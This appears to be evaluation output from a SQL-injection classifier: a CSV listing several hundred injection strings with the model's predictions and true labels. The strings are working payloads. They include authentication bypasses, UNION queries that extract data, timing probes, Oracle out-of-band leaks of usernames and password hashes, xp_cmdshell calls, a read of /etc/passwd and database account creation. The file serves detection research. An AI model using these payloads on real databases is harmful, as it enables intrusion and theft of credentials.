,Query,Prediction,Actual
31,/**/or/**/1/**/  =  /**/1,1,1.0
32," select * from users where id  =  1 or "".  (  "" or 1  =  1 -- 1",1,1.0
33," select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'",1,1.0
34," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",1,1.0
35,or 1  =  1/*,1,1.0
36,%27 or 1  =  1,0,1.0
37," select * from users where id  =  1 <@&@ union select 1,version  (    )   -- 1",1,1.0
38," select * from users where id  =  '1' union select $*$,@@VERSION -- 1'",1,1.0
39,"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1,1.0
40," select * from users where id  =  '1' or $ 1  =  1 union select 1,@@VERSION -- 1'",1,1.0
41,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,1.0
42," select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,1.0
43," select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1,1.0
44," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",1,1.0
45,select * from users where id  =  '1' or \.<\ or 1  =  1 -- 1',1,1.0
46," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",1,1.0
47," select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1,1.0
48," select * from users where id  =  1 or ""$["" or 1  =  1 -- 1",1,1.0
49,or 1 --',1,1.0
50," select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,1.0
51,"admin"" or 1  =  1#",1,1.0
52," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1,1.0
53,\x27UNION SELECT,1,1.0
54,PRINT,0,1.0
55," select * from users where id  =  '1' union select   (  \.  )  ,@@VERSION -- 1'",1,1.0
56,or 1  =  1--,1,1.0
57,1 or pg_sleep  (  __TIME__  )  --,1,1.0
58," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",1,1.0
59,admin'  )   or   (  '1'  =  '1'/*,1,1.0
60,or 2 between 1 and 3,1,1.0
61," select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,1.0
62," select * from users where id  =  1 or 1#"". union select null,version  (    )   -- 1",1,1.0
63,admin' or '1'  =  '1,1,1.0
64,; if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --,1,1.0
65," select * from users where id  =  1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
66,""" or 0  =  0 --",1,1.0
67," select * from users where id  =  1 union select @ $_,version  (    )   -- 1",1,1.0
68,select * from users where id  =  1 <@.$ or 1  =  1 -- 1,1,1.0
69," select * from users where id  =  1 or ""%."" or 1  =  1 -- 1",1,1.0
70," select * from users where id  =  1 + $+*$ union select null,@@VERSION -- 1",1,1.0
71," select * from users where id  =  1 or "",."" or 1  =  1 -- 1",1,1.0
72,char%4039%41%2b%40SELECT,1,1.0
73," select * from users where id  =  1 or ""1&"" or 1  =  1 -- 1",1,1.0
74,admin'  )   or   (  '1'  =  '1,1,1.0
75,declare @s varchar   (  200  )   select @s   =   0x73656c6 ...,1,1.0
76,"or 0  =  0 #""",1,1.0
77," select * from users where id  =  1 or "".]"" or 1  =  1 -- 1",1,1.0
78,  )   or   (  'x'  =  'x,1,1.0
79," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",1,1.0
80,$  (  sleep 50  ) ,1,1.0
81," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",1,1.0
82,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype   =   'u' --",1,1.0
83," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",1,1.0
84," select * from users where id  =  1 or 1#""; union select null,version  (    )   -- 1",1,1.0
85," select * from users where id  =  1 or 1#""? or 1  =  1 -- 1",1,1.0
86,"""a"""" or 1  =  1--""",1,1.0
87," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
88," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1.0
89," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,1.0
90,1 and user_name  (    )     =   'dbo',1,1.0
91,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1,1.0
92," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1,1.0
93," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1,1.0
94,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1,1.0
95,select * from users where id  =  1 +$+. or 1  =  1 -- 1,1,1.0
96,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1,1.0
97," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1.0
98,or 1  =  1 or ''  =  ',1,1.0
99,select * from users where id  =  1   or 1  =  1 -- 1,1,1.0
100,or 'text' > 't',1,1.0
101,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1.0
102," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1,1.0
103," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1,1.0
104,admin' or '1'  =  '1'#,1,1.0
105,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1,1.0
106,s,0,1.0
107," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1.0
108, select * from information_schema.tables--,1,1.0
109," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1,1.0
110,1   )    )    or pg_sleep  (  __TIME__  )  --,1,1.0
111," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1,1.0
112,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1,1.0
113, or 1  =  1 or ''  =  ',1,1.0
114,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1,1.0
115,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1,1.0
116," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,1.0
117," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1,1.0
118,or 'unusual'   =   'unusual',1,1.0
119, or 1 in   (  select @@version  )  --,1,1.0
120,truncate,0,1.0
121,as,1,1.0
122, or 3  =  3 --,1,1.0
123," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
124," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1,1.0
125,"admin""  )   or   (  ""1""  =  ""1",1,1.0
126," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1,1.0
127,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1.0
128," select * from users where id  =  1 union select .1_,version  (    )   -- 1",1,1.0
129, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1,1.0
130," or 0  =  0 #""",1,1.0
131,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1,1.0
132,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1,1.0
133,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1,1.0
134,1  )   or sleep  (  __TIME__  )  #,1,1.0
135," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1,1.0
136," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1,1.0
137," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1,1.0
138,select * from users where id  =  1. <@ or 1  =  1 -- 1,1,1.0
139, or true--,1,1.0
140,; execute immediate 'sel' || 'ect us' || 'er',0,1.0
141,hi' or 'x'  =  'x';,1,1.0
142,select * from users where id  =  1 <@ or 1  =  1 -- 1,1,1.0
143," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,1.0
144,admin' #,1,1.0
145," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1,1.0
146," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1,1.0
147," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1,1.0
148," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1,1.0
149,"""  )  ;waitfor delay '0:0:__TIME__'--",1,1.0
150, or 'unusual'   =   'unusual',1,1.0
151,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1,1.0
152,"admin"" or ""1""  =  ""1""/*",1,1.0
153," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,1.0
154," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1,1.0
155,like,1,1.0
156,or username like char  (  37  )  ;,1,1.0
157, )    )    or pg_sleep  (  __TIME__  )  --,1,1.0
158,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1,1.0
159,or 3  =  3,1,1.0
160," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1,1.0
161,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1,1.0
162,exec sp,1,1.0
163," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1,1.0
164,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1,1.0
165," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,1.0
166,admin' or 1  =  1/*,1,1.0
167,a' waitfor delay '0:0:10'--,1,1.0
168," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1,1.0
169," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1,1.0
170,and 1 in   (  select var from temp  )  --,1,1.0
171,hi'  )   or   (  'a'  =  'a,1,1.0
172," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1.0
173,"admin"" or 1  =  1",1,1.0
174,"""  )   or true--",1,1.0
175," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1,1.0
176," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1,1.0
177,1  )   or pg_sleep  (  __TIME__  )  --,1,1.0
178," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1,1.0
179,"""  )   or sleep  (  __TIME__  )    =  """,1,1.0
180,select * from users where id  =  1.<@. or 1  =  1 -- 1,1,1.0
181,"admin""  )   or   (  ""1""  =  ""1""--",1,1.0
182," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1,1.0
183,; exec xp_regread,1,1.0
184," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,1.0
185,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1,1.0
186," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1,1.0
187," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1,1.0
188,1 and 1  =  1,1,1.0
189,or 0  =  0 #,1,1.0
190,union select * from users where login   =   char ...,1,1.0
191," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1,1.0
192,admin'  )   or '1'  =  '1'--,1,1.0
193,1;SELECT *,1,1.0
194," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1,1.0
195,x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,1,1.0
196," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1.0
197," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1,1.0
198," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1.0
199,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1,1.0
200,procedure,1,1.0
201,or ''  =  ',1,1.0
202, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1,1.0
203," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1.0
204,\'; desc users; --,1,1.0
205," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1,1.0
206,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1,1.0
207,""" or """"^""",1,1.0
208,"""-""",0,1.0
209," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1,1.0
210," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1,1.0
211," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1,1.0
212," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1,1.0
213," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1,1.0
214,admin'/*,1,1.0
215," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1,1.0
216,||UTL_HTTP.REQUEST,0,1.0
217," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1,1.0
218," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,1.0
219,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1,1.0
220," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1,1.0
221," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1,1.0
222,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1,1.0
223,1 uni/**/on select all from where,1,1.0
224," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1,1.0
225," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,1.0
226,admin'  )   or '1'  =  '1'#,1,1.0
227,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',0,1.0
228,or '7659'  =  '7659,1,1.0
229," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1,1.0
230," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1,1.0
231," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1.0
232," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1,1.0
233,or true--,1,1.0
234," select * from users where id  =  1 union select !<1,version  (    )   -- 1",1,1.0
235," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1,1.0
236," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1,1.0
237,""" or true--",1,1.0
238,select * from users where id  =  1. or 1  =  1 -- 1,1,1.0
239," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1,1.0
240," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1,1.0
241,â or 3  =  3 --,1,1.0
242, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1,1.0
243," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1,1.0
244," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1,1.0
245," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1,1.0
246," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1,1.0
247," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1,1.0
248, or uid like '%,1,1.0
249,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1,1.0
250," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1,1.0
251,23 or 1  =  1; --,1,1.0
252," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1,1.0
253," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1,1.0
254," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1,1.0
255,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1,1.0
256," select * from users where id  =  '1' union select \,@@VERSION -- 1'",1,1.0
257,0 or 1  =  1,1,1.0
258,select * from users where id  =  1 &@ or 1  =  1 -- 1,1,1.0
259,"admin""  )   or ""1""  =  ""1",1,1.0
260,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1,1.0
261," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1,1.0
262," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1.0
263," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1.0
264,&apos; OR,1,1.0
265,sqlvuln;,1,1.0
266,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1,1.0
267,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1,1.0
268,""" or """"*""",1,1.0
269,"hi or 1  =  1 --""",1,1.0
270," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1,1.0
271,; exec master..xp_cmdshell 'ping 172.10.1.255'--,0,1.0
272," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1.0
273," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1,1.0
274,select * from information_schema.tables--,1,1.0
275,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1,1.0
276,   (  select top 1,1,1.0
277,Ã½ or 1  =  1 --,1,1.0
278,a' --,0,1.0
279, or 1  =  1 /*,1,1.0
280," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1,1.0
281," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1,1.0
282,--,0,1.0
283,"exec sp_addlogin 'name' , 'password'",1,1.0
284," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1,1.0
285,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1,1.0
286," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,1.0
287," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1,1.0
288,group by userid having 1  =  1--,1,1.0
289," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1,1.0
290,select * from users where id  =  1 *1 or 1  =  1 -- 1,1,1.0
291," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1,1.0
292,‘ or 1  =  1 --,1,1.0
293," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,1.0
294,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1,1.0
295,or 'a'  =  'a,1,1.0
296,declare @s varchar  (  22  )   select @s   = ,1,1.0
297," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,1.0
298," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,1.0
299," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,1.0
300,@variable,1,1.0
301,; exec master..xp_cmdshell,1,1.0
302,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1,1.0
303," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,1.0
304," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,1.0
305," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,1.0
306," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,1.0
307, and 1 in   (  select var from temp  )  --,1,1.0
308," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,1.0
309," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,1.0
310," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,1.0
311,or x  =  x,1,1.0
312,or a  =  a,1,1.0
313,or '1'  =  '1,1,1.0
314," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,1.0
315,   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,1.0
316," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,1.0
317," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,1.0
318," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1.0
319,; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,1.0
320,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,1.0
321," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,1.0
322," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,1.0
323," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,1.0
324," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,1.0
325,a' or 1  =  1--,1,1.0
326, )   or   (  a  =  a,1,1.0
327,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,1.0
328," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,1.0
329," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,1.0
330,-- &password  = ,1,1.0
331,select * from users where id  =  1 <@. or 1  =  1 -- 1,1,1.0
332," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,1.0
333," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,1.0
334," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,1.0
335, or '1'  =  '1,1,1.0
336,admin' or 1  =  1,1,1.0
337," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,1.0
338," select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,1.0
339," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,1.0
340," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,1.0
341," union select * from users where login   =   char  (  114,111,111,116  )  ;",1,1.0
342," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,1.0
343, or 1  =  1--,1,1.0
344," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,1.0
345,pg_sleep  (  __TIME__  )  --,1,1.0
346,‘ or 3  =  3 --,1,1.0
347," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,1.0
348," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,1.0
349, )   union select * from information_schema.tables;,1,1.0
350," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,1.0
351,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,1.0
352, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,1.0
353," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1.0
354,""" or """" """,1,1.0
355,delete,0,1.0
356,;waitfor delay '0:0:__TIME__'--,1,1.0
357, or 1  =  1 --,1,1.0
358,1' and non_existant_table   =   '1,1,1.0
